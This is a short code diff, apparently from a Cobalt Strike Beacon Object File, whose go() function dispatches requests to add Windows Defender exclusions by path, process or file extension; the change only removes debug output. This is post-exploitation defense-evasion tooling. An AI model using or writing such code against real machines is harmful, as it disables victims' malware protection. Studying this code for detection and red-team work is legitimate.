@@ -114,7 +114,6 @@ Cleanup:
 }
 
 
-
 int go(char *args, int len) {
     int result = 0; 
 	CHAR* exclType = ""; //path | process | extension
@@ -124,11 +123,7 @@ int go(char *args, int len) {
     BeaconDataParse(&parser, args, len);
 	exclType = BeaconDataExtract(&parser, NULL);
     exclData = BeaconDataExtract(&parser, NULL);
-	
-	BeaconPrintf(CALLBACK_OUTPUT, "exclType: %s\n", exclType);  //DEBUG
-	BeaconPrintf(CALLBACK_OUTPUT, "exclData: %ls\n", exclData);  //DEBUG
 
-	
 	if(MSVCRT$strcmp(exclType, "path") == 0) result = AddDefenderExclusion(exclData, EXCLUSION_TYPE_PATH);
     else if(MSVCRT$strcmp(exclType, "process") == 0) result = AddDefenderExclusion(exclData, EXCLUSION_TYPE_PROCESS);
 	else if(MSVCRT$strcmp(exclType, "extension") == 0) result = AddDefenderExclusion(exclData, EXCLUSION_TYPE_EXTENSION);
